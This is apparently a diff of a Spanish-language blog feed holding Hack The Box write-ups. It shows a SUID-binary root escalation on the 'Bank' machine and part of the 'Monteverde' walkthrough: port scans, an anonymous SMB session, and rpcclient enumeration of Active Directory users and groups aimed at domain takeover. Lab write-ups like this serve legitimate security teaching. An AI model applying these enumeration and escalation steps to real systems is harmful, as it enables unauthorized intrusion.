+./usr/bin/at
+./usr/bin/chsh
+./usr/bin/passwd
+./usr/bin/chfn
+./usr/bin/pkexec
+./usr/bin/newgrp
+./usr/bin/traceroute6.iputils
+./usr/bin/gpasswd
+./usr/bin/sudo
+./usr/bin/mtr
+./usr/sbin/uuidd
+./usr/sbin/pppd
+./bin/ping
+./bin/ping6
+./bin/su
+./bin/fusermount
+./bin/mount
+./bin/umount
+www-data@bank:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos encontramos con el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/htb/bin/emergency&lt;/code&gt; el cual tiene permisos SUID, por lo tanto vamos a probar a ejecutarlo a ver que pasa.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bank:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/var/htb/bin/emergency
+&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+root
+&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt). Si le aplicamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; al binario, vemos que podría hacer multiples cosas y una cadena imprimible en donde se observa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, que es lo que nos despliega al ejecutarlo.&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Linux" /><category term="PHP" /><category term="Arbitrary_File_Upload" /><category term="SUID" /><summary type="html">Resolución de la máquina Bank en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box SwagShop</title><link href="http://localhost:4000/htb-swagshop/" rel="alternate" type="text/html" title="Hack The Box SwagShop" /><published>2022-02-27T00:00:00-06:00</published><updated>2022-02-27T00:00:00-06:00</updated><id>http://localhost:4000/htb-swagshop</id><content type="html" xml:base="http://localhost:4000/htb-swagshop/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-swagshop/banner-swagshop.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;swagshop&quot;&gt;SwagShop&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.140.&lt;/p&gt;
@@ -4800,673 +5187,4 @@ firefart@popcorn:/dev/shm# &lt;span class=&quot;nb&quot;&gt;id
 firefart@popcorn:/dev/shm# 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Vemos que dicho usuario se encuentra en el grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, es como si cambiara el nombre de &lt;strong&gt;root&lt;/strong&gt; por &lt;strong&gt;firefart&lt;/strong&gt;, conservando todos los privilegios del usuario &lt;strong&gt;root&lt;/strong&gt;; por lo tanto, de esta forma podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><category term="Web" /><summary type="html">Resolución de la máquina Popcorn en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Monteverde</title><link href="http://localhost:4000/htb-monteverde/" rel="alternate" type="text/html" title="Hack The Box Monteverde" /><published>2022-01-15T00:00:00-06:00</published><updated>2022-01-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-monteverde</id><content type="html" xml:base="http://localhost:4000/htb-monteverde/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-monteverde/banner-monteverde.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;monteverde&quot;&gt;Monteverde&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.172.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.172
-PING 10.10.10.172 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.172&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.172: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.172 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.923/136.923/136.923/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-15 16:52 CST
-Initiating SYN Stealth Scan at 16:52        
-Scanning 10.10.10.172 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]          
-Discovered open port 53/tcp on 10.10.10.172   
-Discovered open port 139/tcp on 10.10.10.172  
-Discovered open port 445/tcp on 10.10.10.172  
-Discovered open port 135/tcp on 10.10.10.172  
-Discovered open port 636/tcp on 10.10.10.172 
-Discovered open port 3268/tcp on 10.10.10.172
-Discovered open port 49674/tcp on 10.10.10.172
-Discovered open port 49673/tcp on 10.10.10.172
-Discovered open port 49693/tcp on 10.10.10.172
-Discovered open port 49676/tcp on 10.10.10.172
-Discovered open port 9389/tcp on 10.10.10.172
-Discovered open port 593/tcp on 10.10.10.172
-Discovered open port 49667/tcp on 10.10.10.172                                                                                   
-Discovered open port 5985/tcp on 10.10.10.172
-Discovered open port 389/tcp on 10.10.10.172  
-Discovered open port 3269/tcp on 10.10.10.172
-Discovered open port 88/tcp on 10.10.10.172      
-Discovered open port 464/tcp on 10.10.10.172                                                                                     
-Completed SYN Stealth Scan at 16:52, 26.44s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.172               
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
-Scanned at 2022-01-15 16:52:04 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s      
-Not shown: 65517 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT      STATE SERVICE          REASON
-53/tcp    open  domain           syn-ack ttl 127
-88/tcp    open  kerberos-sec     syn-ack ttl 127
-135/tcp   open  msrpc            syn-ack ttl 127
-139/tcp   open  netbios-ssn      syn-ack ttl 127
-389/tcp   open  ldap             syn-ack ttl 127
-445/tcp   open  microsoft-ds     syn-ack ttl 127
-464/tcp   open  kpasswd5         syn-ack ttl 127
-593/tcp   open  http-rpc-epmap   syn-ack ttl 127
-636/tcp   open  ldapssl          syn-ack ttl 127
-3268/tcp  open  globalcatLDAP    syn-ack ttl 127
-3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
-5985/tcp  open  wsman            syn-ack ttl 127
-9389/tcp  open  adws             syn-ack ttl 127
-49667/tcp open  unknown          syn-ack ttl 127
-49673/tcp open  unknown          syn-ack ttl 127
-49674/tcp open  unknown          syn-ack ttl 127
-49676/tcp open  unknown          syn-ack ttl 127
-49693/tcp open  unknown          syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.52 seconds
-           Raw packets sent: 131064 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.767MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 30 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.320KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.172
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p53&lt;/span&gt;,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-15 16:53 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.172
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-01-15 22:53:31Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-49667/tcp open  msrpc         Microsoft Windows RPC
-49673/tcp open  msrpc         Microsoft Windows RPC
-49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49676/tcp open  msrpc         Microsoft Windows RPC
-49693/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: MONTEVERDE&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-time: 
-|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-01-15T22:54:26
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;101.32 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el puerto 445 abierto, así que trataremos de conectarnos a través de una &lt;strong&gt;&lt;em&gt;Null Session&lt;/em&gt;&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-Anonymous login successful
-
-        Sharename       Type      Comment
-        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
-❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'null'&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Authentication error on 10.10.10.172
-❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: 10.10.10.172
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No vemos nada interesante, así que ahora vamos a tratar de ocupar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt; para ver si podemos conectarnos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; enumdomusers
-user:[Guest] rid:[0x1f5]
-user:[AAD_987d7f2f57d2] rid:[0x450]
-user:[mhope] rid:[0x641]
-user:[SABatchJobs] rid:[0xa2a]
-user:[svc-ata] rid:[0xa2b]
-user:[svc-bexec] rid:[0xa2c]
-user:[svc-netapp] rid:[0xa2d]
-user:[dgalanos] rid:[0xa35]
-user:[roleary] rid:[0xa36]
-user:[smorgan] rid:[0xa37]
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos la capacidad de obtener información de &lt;strong&gt;Active Directory&lt;/strong&gt; y para facilitarnos las cosas, haremos uso de la herramienta &lt;a href=&quot;https://github.com/s4vitar/rpcenum&quot;&gt;rpcenum&lt;/a&gt; para dumpear la información que nos interesa.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uso: rpcenum
-
-        e&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Enumeration Mode
-
-                DUsers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Users&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-                DUsersInfo &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Users with info&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-                DAUsers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Admin Users&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-                DGroups &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Groups&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-                All &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;All Modes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-        i&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Host IP Address
-
-        h&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Show this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;pannel
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Domain Users&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; DUsers &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enumerating Domain Users...
-
-  +                   +
-  | Users             |
-  +                   +
-  | Guest             |
-  | AAD_987d7f2f57d2  |
-  | mhope             |
-  | SABatchJobs       |
-  | svc-ata           |
-  | svc-bexec         |
-  | svc-netapp        |
-  | dgalanos          |
-  | roleary           |
-  | smorgan           |
-  +                   +
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Domain Users with info&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; DUsersInfo &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Listing domain &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;with description...
-
-  +                   +                                                                                                                                                    +
-  | User              | Description                                                                                                                                        |
-  +                   +                                                                                                                                                    +
-  | Guest             | Built-in account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;guest access to the computer/domain                                                                                           |
-  | AAD_987d7f2f57d2  | Service account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.  |
-  +                   +                                                                                                                                                    +
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Domain Admin Users&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; DAUsers &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enumerating Domain Admin Users...
-
-  +                   +
-  | DomainAdminUsers  |
-  +                   +
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Domain Groups&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcenum &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; DGroups &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.172
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enumerating Domain Groups...
-
-  +                                          +                                                                                                                   +
-  | DomainGroup                              | Description                                                                                                       |
-  +                                          +                                                                                                                   +
-  | Enterprise Read-only Domain Controllers  | Members of this group are Read-Only Domain Controllers &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the enterprise                                          |
-  | Domain Users                             | All domain &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;                                                                                                  |
-  | Domain Guests                            | All domain guests                                                                                                 |
-  | Domain Computers                         | All workstations and servers joined to the domain                                                                 |
-  | Group Policy Creator Owners              | Members &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this group can modify group policy &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the domain                                                      |
-  | Cloneable Domain Controllers             | Members of this group that are domain controllers may be cloned.                                                  |
-  | Protected Users                          | Members of this group are afforded additional protections against authentication security threats. See http       |
-  | DnsUpdateProxy                           | DNS clients &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are permitted to perform dynamic updates on behalf of some other clients &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;such as DHCP servers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  |
-  | Azure Admins                             |                                                                                                                   |
-  | File Server Admins                       |                                                                                                                   |
-  | Call Recording Admins                    |                                                                                                                   |
-  | Reception                                |                                                                                                                   |
-  | Operations                               |                                                                                                                   |
-  | Trading                                  |                                                                                                                   |
-  | HelpDesk                                 |                                                                                                                   |
-  | Developers                               |                                                                                                                   |
-  +                                          +                                                                                                                   +
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Con la información que tenemos, ya debemos ver un grupo del cual podriamos abusar &lt;strong&gt;Azure Admins&lt;/strong&gt; ya que como buen atacante vamos a ir por la administración del dominio y comprometer los equipos; por lo tanto, vamos a ver que usuarios pertenecen a dicho grupo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; enumdomgroups
-group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
-group:[Domain Users] rid:[0x201]
-group:[Domain Guests] rid:[0x202]
-group:[Domain Computers] rid:[0x203]
-group:[Group Policy Creator Owners] rid:[0x208]
-group:[Cloneable Domain Controllers] rid:[0x20a]
-group:[Protected Users] rid:[0x20d]
-group:[DnsUpdateProxy] rid:[0x44e]
-group:[Azure Admins] rid:[0xa29]
-group:[File Server Admins] rid:[0xa2e]
-group:[Call Recording Admins] rid:[0xa2f]
-group:[Reception] rid:[0xa30]
-group:[Operations] rid:[0xa31]
-group:[Trading] rid:[0xa32]
-group:[HelpDesk] rid:[0xa33]
-group:[Developers] rid:[0xa34]
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; querygroupmem 0xa29
-        rid:[0x1f4] attr:[0x7]
-        rid:[0x450] attr:[0x7]
-        rid:[0x641] attr:[0x7]
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; queryuser 0x1f4                                                                                                     
-result was NT_STATUS_ACCESS_DENIED                                                                                               
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;
-rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; queryuser 0x450                                                                                                     
-        User Name   :   AAD_987d7f2f57d2                                                                                         
-        Full Name   :   AAD_987d7f2f57d2                                                                                         
-        Home Drive  :                                                                                                            
-        Dir Drive   :      
-        Profile Path:        
-        Logon Script:        
